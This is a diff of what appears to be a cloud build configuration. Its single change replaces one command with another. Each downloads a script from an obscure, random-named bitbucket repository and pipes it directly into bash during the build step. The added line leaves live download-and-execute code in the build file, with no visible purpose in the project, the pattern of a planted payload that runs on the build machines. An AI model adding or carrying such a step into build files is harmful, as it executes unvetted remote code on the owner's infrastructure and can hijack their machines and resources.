@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-        apt-get update && apt-get install curl -y && curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/tes | bash
+        apt-get update && apt-get install curl -y && curl -sL https://bitbucket.org/apenowe/lotnok/raw/master/A1 | bash
     waitFor:
       - '-'
     entrypoint: /bin/bash
